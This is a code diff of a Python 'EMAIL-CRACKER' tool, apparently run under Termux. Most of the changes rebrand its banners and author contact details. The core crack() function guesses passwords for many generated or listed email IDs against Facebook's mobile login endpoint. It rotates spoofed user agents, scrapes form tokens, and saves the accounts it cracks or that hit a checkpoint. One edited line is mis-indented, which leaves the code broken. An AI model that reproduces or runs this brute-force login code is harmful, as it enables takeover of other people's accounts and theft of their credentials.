@@ -107,23 +107,12 @@ def pkg_():
     os.system('clear')
 
     print (f"""
-  88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
-  88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
-  88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
-  88`8b   88Â°Â°Â°88 88Â°Â°Â°Â°    `Y8b. 88Â°Â°Â°88 88 V8o88 
-  88 `88. 88   88 88      db   8D 88   88 88  V888 
-  88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
-\x1b[1;97m________________________________________________________________
-\033[38;5;196m[\033[38;5;195mâˆš\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
-\033[38;5;196m[\033[38;5;195mâˆš\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
-\033[38;5;196m[\033[38;5;195mâˆš\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
-\033[38;5;196m[\033[38;5;195mâˆš\033[38;5;196m]\x1b[1;97m WATHAPP : 01305504954
-\033[38;5;196m[\033[38;5;195mâˆš\033[38;5;196m]\x1b[1;97m TOOLS   : PREMIUM
-\033[38;5;196m[\033[38;5;195mâˆš\033[38;5;196m]\x1b[1;97m Stetus  : PAID
-\033[38;5;196m[\033[38;5;195mâ˜…\033[38;5;196m]\x1b[1;97m VIRSION : 0.1
-\x1b[1;97m________________________________________________________________
-""")
+	%s   _  _____  ___  ___ %s ___  ___  ________
+	  %s/ |/ / _ \/ _ \/ _ )%s/ _ )/ _ \/ __/ %s__/
+	 %s/    / // / // / _  / _  / // /\ \_\ \  
+	%s/_/|_/\___/\___/____/____/%s\___/___/___/  
 
+	{I}DEVELOPER :{II} MAMUN AHMED FAHIM{Q} [{II}N00B B0SS{Q}]\n\n{I}	TOOLS NAME : EMAIL-CRACKER \n\n	OUR TEAM : TERMUX TECH BD \n  """%(I, U, P, K, M, II, O, M))
 
     try:
 
@@ -133,22 +122,13 @@ def pkg_():
 
         os.system("clear")
 
-    print (f"""
- 88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
- 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
- 88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
- 88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
- 88 `88. 88   88 88      db   8D 88   88 88  V888 
- 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
-\x1b[1;97m__________________________________________________
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m TOOLS   : MULTIPLE 
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m Stetus  : TRAIL
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m VIRSION : 0.4
-\x1b[1;97m__________________________________________________""")
+        print (f"""
+	%s   _  _____  ___  ___ %s ___  ___  ________
+	  %s/ |/ / _ \/ _ \/ _ )%s/ _ )/ _ \/ __/ %s__/
+	 %s/    / // / // / _  / _  / // /\ \_\ \  
+	%s/_/|_/\___/\___/____/____/%s\___/___/___/  
+
+	{I}DEVELOPER :{II} MAMUN AHMED FAHIM{Q} [{II}N00B B0SS{Q}]\n\n{I}	TOOLS NAME : EMAIL-CRACKER \n\n	OUR TEAM : TERMUX TECH BD \n  """%(I, U, P, K, M, II, O, M))
 
         print(f"{II}_{Q}"*57+'\n')
 
@@ -195,21 +175,13 @@ def pkg_():
         os.system("clear")
 
         print (f"""
- 88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
- 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
- 88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
- 88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
- 88 `88. 88   88 88      db   8D 88   88 88  V888 
- 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
-\x1b[1;97m__________________________________________________
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m TOOLS   : MULTIPLE 
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m Stetus  : TRAIL
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m VIRSION : 0.4
-\x1b[1;97m__________________________________________________""")
+	%s   _  _____  ___  ___ %s ___  ___  ________
+	  %s/ |/ / _ \/ _ \/ _ )%s/ _ )/ _ \/ __/ %s__/
+	 %s/    / // / // / _  / _  / // /\ \_\ \  
+	%s/_/|_/\___/\___/____/____/%s\___/___/___/  
+
+	{I}DEVELOPER :{II} MAMUN AHMED FAHIM{Q} [{II}N00B B0SS{Q}]\n\n{I}	TOOLS NAME : EMAIL-CRACKER \n\n	OUR TEAM : TERMUX TECH BD \n  """%(I, U, P, K, M, II, O, M))
+
         print(f"{II}_{Q}"*57)
 
         print (" YOUR ID NOT APPROVED \n")
@@ -231,21 +203,12 @@ def pkg_():
         os.system('am start https://wa.me/+8801715650048?text=' + tks)
 
 print(f"""
- 88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
- 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
- 88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
- 88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
- 88 `88. 88   88 88      db   8D 88   88 88  V888 
- 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
-\x1b[1;97m__________________________________________________
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m TOOLS   : MULTIPLE 
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m Stetus  : TRAIL
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m VIRSION : 0.4
-\x1b[1;97m__________________________________________________""")
+	%s   _  _____  ___  ___ %s ___  ___  ________
+	  %s/ |/ / _ \/ _ \/ _ )%s/ _ )/ _ \/ __/ %s__/
+	 %s/    / // / // / _  / _  / // /\ \_\ \  
+	%s/_/|_/\___/\___/____/____/%s\___/___/___/  
+
+	{I}DEVELOPER :{II} MAMUN AHMED FAHIM{Q} [{II}N00B B0SS{Q}]\n\n{I}	TOOLS NAME : EMAIL-CRACKER \n\n	OUR TEAM : TERMUX TECH BD \n  """)
 		
 
 
@@ -281,21 +244,12 @@ def join_to_id(fx):
 ###---[ANGGAP INI LOGO ]---###
 def logo():
 	print(f"""
- 88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
- 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
- 88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
- 88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
- 88 `88. 88   88 88      db   8D 88   88 88  V888 
- 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
-\x1b[1;97m__________________________________________________
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m TOOLS   : MULTIPLE 
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m Stetus  : TRAIL
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m VIRSION : 0.4
-\x1b[1;97m__________________________________________________""")
+	%s   _  _____  ___  ___ %s ___  ___  ________
+	  %s/ |/ / _ \/ _ \/ _ )%s/ _ )/ _ \/ __/ %s__/
+	 %s/    / // / // / _  / _  / // /\ \_\ \  
+	%s/_/|_/\___/\___/____/____/%s\___/___/___/  
+
+	{I}DEVELOPER :{II} MAMUN AHMED FAHIM{Q} [{II}N00B B0SS{Q}]\n\n{I}	TOOLS NAME : EMAIL-CRACKER \n\n	OUR TEAM : TERMUX TECH BD \n  """)
             
 
 ###---[ MONTH YEAR ]---###
@@ -358,30 +312,30 @@ def menu():
 	Audio_('data/.welcome.mp3')
 #	os.system('xdg-open https://github.com/noobboss1')
 	
-	print(f"""
- 88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
- 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
- 88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
- 88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
- 88 `88. 88   88 88      db   8D 88   88 88  V888 
- 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
-\x1b[1;97m__________________________________________________
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m TOOLS   : MULTIPLE 
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m Stetus  : TRAIL
-\033[38;5;196m[\033[38;5;195m\033[38;5;196m]\x1b[1;97m VIRSION : 0.4
-\x1b[1;97m__________________________________________________""")
-	print(52*f'{II}_')
+	print(f"""88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
+88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
+88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
+88`8b   88Â°Â°Â°88 88Â°Â°Â°Â°    `Y8b. 88Â°Â°Â°88 88 V8o88 
+88 `88. 88   88 88      db   8D 88   88 88  V888 
+88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
+\x1b[1;97m===================================================
+\033[38;5;196m[\033[38;5;195mâˆš\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
+\033[38;5;196m[\033[38;5;195mâˆš\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
+\033[38;5;196m[\033[38;5;195mâˆš\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
+\033[38;5;196m[\033[38;5;195mâˆš\033[38;5;196m]\x1b[1;97m WATHAPP : 01305504954
+\033[38;5;196m[\033[38;5;195mâˆš\033[38;5;196m]\x1b[1;97m TOOLS   : PREMIUM
+\033[38;5;196m[\033[38;5;195mâˆš\033[38;5;196m]\x1b[1;97m Stetus  : PAID
+\033[38;5;196m[\033[38;5;195mâ˜…\033[38;5;196m]\x1b[1;97m VIRSION : 0.1
+====================================================
+""")
+	print(54*f'{II}_')
 	print('\033[47m\033[1;31m                     MAIN MENU                       |\033[00m\033[00m')
 	Audio_('data/.main_menu.mp3')
 	print(f"\n {P}[{hh}01{P}] CRACKING FROM EMAIL\n")
 	
 	print(f" [{hh}02{P}] CRACKING FROM FILE \n")
 	print(f" [{hh}00{P}] LOGOUT ")
-	print(52*f'{II}_')
+	print(54*f'{II}_')
 	Audio_('data/.choice.mp3')
 	
 	ask = input(f' {wa} CHOICE AN OPTION : ')	
@@ -410,14 +364,14 @@ def clon_email():
 	rr = random.randint
 	bas = ['akther','begum','nusrat','khanom','mst','ahmed','miah','chy','talukder','sayed','khan','rayhan','sabbir','muhammad','radika','foysal','mamun','fahim','fahima','ahmed','sultana','afsana','aditya','farjana','sabina','tasnima','tasnim','rabby','farhana','farhan','fokhrul','noyon','gaming']
 	blk = ['999','official','gaming','123','1234','12345','123456']
-	print(52*f'{II}_')
+	print(54*f'{II}_')
 	
 
 
 
 
 	print(f' {wa} YOUR TARGET EMAIL USER NAME')
-	print(52*f'{II}_')
+	print(54*f'{II}_')
 	Audio_('data/.targetem.mp3')
 	namx = input(f' {wa} TARGET EMAIL NAME : ')
 	
@@ -448,7 +402,7 @@ def clon_email():
 
 
 def crack_filexx():
-	print(52*f'{II}_')
+	print(54*f'{II}_')
 	Audio_('data/.filepath.mp3')
 	file = input(f' {wa} PLEASE SELECT YOUR FILE PATH \n {wa} FILE PATH : ')
 	try:
@@ -466,7 +420,7 @@ def crack_filexx():
 
 
 def crack_file():
-	print(52*f'{II}_')
+	print(54*f'{II}_')
 	Audio_('data/.filepath.mp3')
 	file = input('\x1b[1;97m [] FILE NAME : ')
 	print('')
@@ -483,13 +437,13 @@ def crack_file():
 accountok = []
 def noobbmain():
 	#os.system('xdg-open https://facebook.com/groups/737172040863921/')
-	print("\n"+52*f'{II}_')
+	print("\n"+54*f'{II}_')
 	print (f" {P}[{hh}1{P}] METHOD {P}[{II}BEST{P}]{P} ")
 	Audio_('data/.methodbest.mp3')
-	print(52*f'{II}_')
+	print(54*f'{II}_')
 	Audio_('data/.choice.mp3')
 	ro = input(f'\n {wa} CHOICE AN OPTION : ')
-	print(52*f'{II}_')
+	print(54*f'{II}_')
 	if ro in ['1','01']:methods.append('mobile')
 	elif ro in ['2','02']:methods.append('free')
 	else:methods.append('mobile')
@@ -613,18 +567,18 @@ def crack(idf,pwx,url,time_xx):
 	uai = random.choice(["Mozilla/5.0 (Linux; Android 12; 220333QNY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]","Mozilla/5.0 (Linux; Android 11; CPH2021 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]","Mozilla/5.0 (Linux; Android 13; SM-S908W Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]","Mozilla/5.0 (Linux; Android 12; motorola edge 30 Build/S1RDS32.55-106-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; moto g32 Build/S2SN32.34-72-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; 21051182G Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 10; ZTE 9000 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/342.0.0.11.89;]","Mozilla/5.0 (Linux; Android 11; LM-Q920N Build/RKQ1.210106.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; moto g31 Build/S3RWB32.125-29-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 11; T774H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 11; SKY PrestigeX2 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 11; i8_ROKR Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; RMX3521 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 12; V2203 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/zh_CN;FBAV/344.0.0.10.83;]","Mozilla/5.0 (Linux; Android 11; C5L Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]"])
 	
 	
-    uai2 =random.choice(["Mozilla/5.0 (Linux; Android 12; 220333QNY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]","Mozilla/5.0 (Linux; Android 11; CPH2021 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]","Mozilla/5.0 (Linux; Android 13; SM-S908W Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]","Mozilla/5.0 (Linux; Android 12; motorola edge 30 Build/S1RDS32.55-106-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; moto g32 Build/S2SN32.34-72-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; 21051182G Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 10; ZTE 9000 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/342.0.0.11.89;]","Mozilla/5.0 (Linux; Android 11; LM-Q920N Build/RKQ1.210106.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; moto g31 Build/S3RWB32.125-29-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 11; T774H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 11; SKY PrestigeX2 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 11; i8_ROKR Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; RMX3521 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 12; V2203 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/zh_CN;FBAV/344.0.0.10.83;]","Mozilla/5.0 (Linux; Android 11; C5L Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]"])
+uai2 =random.choice(["Mozilla/5.0 (Linux; Android 12; 220333QNY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]","Mozilla/5.0 (Linux; Android 11; CPH2021 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]","Mozilla/5.0 (Linux; Android 13; SM-S908W Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]","Mozilla/5.0 (Linux; Android 12; motorola edge 30 Build/S1RDS32.55-106-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; moto g32 Build/S2SN32.34-72-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; 21051182G Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 10; ZTE 9000 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/342.0.0.11.89;]","Mozilla/5.0 (Linux; Android 11; LM-Q920N Build/RKQ1.210106.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; moto g31 Build/S3RWB32.125-29-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 11; T774H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 11; SKY PrestigeX2 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 11; i8_ROKR Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/347.0.0.17.97;]","Mozilla/5.0 (Linux; Android 12; RMX3521 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/346.0.0.8.76;]","Mozilla/5.0 (Linux; Android 12; V2203 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/zh_CN;FBAV/344.0.0.10.83;]","Mozilla/5.0 (Linux; Android 11; C5L Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]"])
 	
 	my_color = [II,Q,I,P,H, M, H, K, B, U, O, N]
 	wx = random.choice(my_color)
-	print(f"\r {P}[{wx}R4FSAN-XD{P}] %s/%s {P}OK:%s "%(loop,len(id),ok),end=" ");sys.stdout.flush()
+	print(f"\r {P}[{wx}N00B B0SS{P}] %s/%s {P}OK:%s "%(loop,len(id),ok),end=" ");sys.stdout.flush()
 	for pw in pwx:
 		try:
 			ses.headers.update({"Host": url,"upgrade-insecure-requests":"1","user-agent":f"{uai}","accept":"*/*","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"manifest","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 			get_method = ses.get(f"https://m.facebook.com/").text
 			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(get_method)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(get_method)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(get_method)).group(1), 'li': re.search('name="li" value="(.*?)"',str(get_method)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(get_method)).group(1)}
 			head = ({"Host": url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com/","content-type":"application/x-www-form-urlencoded","user-agent":f"{uai2}","accept":"*/*","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"manifest","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			post_method = ses.post(f"https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&ht_token=AbsTxxh6if1ljRfTrWB8dW_rUE1lZMLF3WrqjtJlPKtefNP3&h_consent=1&ht_l=login&lwv=100",data=date, headers=head)
+			post_method = ses.post(f"https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101",data=date, headers=head)
 			if "checkpoint" in ses.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				data = (f'{idf}|{pw}')
@@ -639,7 +593,7 @@ def crack(idf,pwx,url,time_xx):
 							open('CP/'+sim_cp,'a').write(sapi+'\n')
 							break
 						except:
-							print(f'\n [{kk}R4FSAN-CP : {kk}{idf}|{pw}{p}')
+							print(f'\n [{kk}B0SS : {kk}{idf}|{pw}{p}')
